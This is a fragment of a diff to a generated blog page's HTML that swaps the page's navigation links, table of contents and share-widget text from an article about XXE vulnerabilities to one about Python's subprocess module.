+            <span>原始链接:</span><a class="post-url" href="/2019/04/11/03python模块之subprocess/" title="Python模块 Chapter 3：subprocess">https://sakuxa.com/2019/04/11/03python模块之subprocess/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/04/11/03python模块之subprocess/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -415,16 +472,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/04/xxe-tool/">
-                    XXE漏洞利用工具及其资源
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/02/28/xml/">
-                    XML基本知识学习
+                <a href="/2019/04/09/02python模块之re/">
+                    Python模块 Chapter 2：RE
                 </a>
             </div>
         
@@ -436,7 +487,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-必备XML基础知识"><span class="toc-number">1.</span> <span class="toc-text">0x00 必备XML基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-XXE漏洞概述"><span class="toc-number">2.</span> <span class="toc-text">0x01 XXE漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-恶意引入外部实体"><span class="toc-number">3.</span> <span class="toc-text">0x02 恶意引入外部实体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-XXE漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03 XXE漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-漏洞防御"><span class="toc-number">5.</span> <span class="toc-text">0x04 漏洞防御</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-概述"><span class="toc-number">1.</span> <span class="toc-text">0x00 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-subprocess-Popen"><span class="toc-number">2.</span> <span class="toc-text">0x01 subprocess.Popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-subprocess-run"><span class="toc-number">3.</span> <span class="toc-text">0x02 subprocess.run()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-subprocess-CompletedProcess"><span class="toc-number">4.</span> <span class="toc-text">0x04 subprocess.CompletedProcess()</span></a></li></ol>
         
     </div>
     <style>
@@ -472,7 +523,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"XXE（XML External Entity）漏洞　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Python模块 Chapter 3：subprocess　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -492,15 +543,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/04/xxe-tool/" title="上一篇: XXE漏洞利用工具及其资源">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/02/28/xml/" title="下一篇: XML基本知识学习">
+            <a href="/2019/04/09/02python模块之re/" title="下一篇: Python模块 Chapter 2：RE">
                 <i class="fa fa-angle-right"></i>
             </a>
         
